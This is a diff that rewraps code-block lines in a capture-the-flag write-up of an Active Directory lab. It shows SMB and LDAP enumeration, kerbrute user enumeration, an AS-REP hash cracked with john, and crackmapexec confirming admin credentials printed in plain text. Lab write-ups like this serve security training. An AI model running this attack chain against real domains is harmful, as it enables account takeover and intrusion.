@@ -6,7 +6,8 @@ An nmap nse ldap script found the domain name of the system.
 
 ```
 PORT    STATE SERVICE REASON          VERSION
-389/tcp open  ldap    syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local, Site: Default-First-Site-Name)
+389/tcp open  ldap    syn-ack ttl 125 Microsoft Windows Active Directory LDAP 
+(Domain: vulnnet-rst.local, Site: Default-First-Site-Name)
 | ldap-rootdse: 
 | LDAP Results
 |   <ROOT>
@@ -20,7 +21,8 @@ PORT    STATE SERVICE REASON          VERSION
 Two intersting SMB shares were able to read read anonymously. 
 
 ```
-VulnNet-Business-Anonymous                        	READ ONLY	VulnNet Business Sharing
+VulnNet-Business-Anonymous                        	READ ONLY	VulnNet Business
+Sharing
 	.\VulnNet-Business-Anonymous\*
 	dr--r--r--                0 Fri Mar 12 22:21:04 2021	.
 	dr--r--r--                0 Fri Mar 12 22:21:04 2021	..
@@ -51,7 +53,8 @@ Using kerbrute's userenum module in conjunction the usernames list I found 4
 valid usernames. 
  
 ```
-[kali@kali ~/thm/vulnet-roasted/exploit] /opt/kerbrute/kerbrute_linux_386 userenum -d vulnnet-rst.local --dc 10.10.174.217  usernames.txt 
+[kali@kali ~/thm/vulnet-roasted/exploit] /opt/kerbrute/kerbrute_linux_386 
+userenum -d vulnnet-rst.local --dc 10.10.174.217  usernames.txt 
 
     __             __               __     
    / /_____  _____/ /_  _______  __/ /____ 
@@ -95,7 +98,8 @@ $krb5asrep$23$t-skid@VULNNET-RST.LOCAL:8bd68bdbd1c4ceca5c9470bcad44201a$42c17552
 I used john to crack the t-skids password with the `rockyou.txt` wordlist. 
 
 ```
-[kali@kali ~/thm/vulnet-roasted/loot] john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep asrep.hash
+[kali@kali ~/thm/vulnet-roasted/loot] john --wordlist=/usr/share/wordlists/rockyou.txt 
+--format=krb5asrep asrep.hash
 Using default input encoding: UTF-8
 Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
 Will run 4 OpenMP threads
@@ -121,7 +125,8 @@ strPassword = "bNdKVkjv3RR9ht"
 Using crackmapexec I confirmed that these credentials were valid. 
 
 ```
-[kali@kali ~/thm/vulnet-roasted/loot] crackmapexec smb -u 'a-whitehat' -p 'bNdKVkjv3RR9ht' -d vulnnet-rst.local 10.10.174.217         
+[kali@kali ~/thm/vulnet-roasted/loot] crackmapexec smb -u 'a-whitehat'
+-p 'bNdKVkjv3RR9ht' -d vulnnet-rst.local 10.10.174.217         
 SMB         10.10.174.217   445    WIN-2BO8M1OE1M1  [*] Windows 10.0 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)
 SMB         10.10.174.217   445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\a-whitehat:bNdKVkjv3RR9ht (Pwn3d!)
 ```
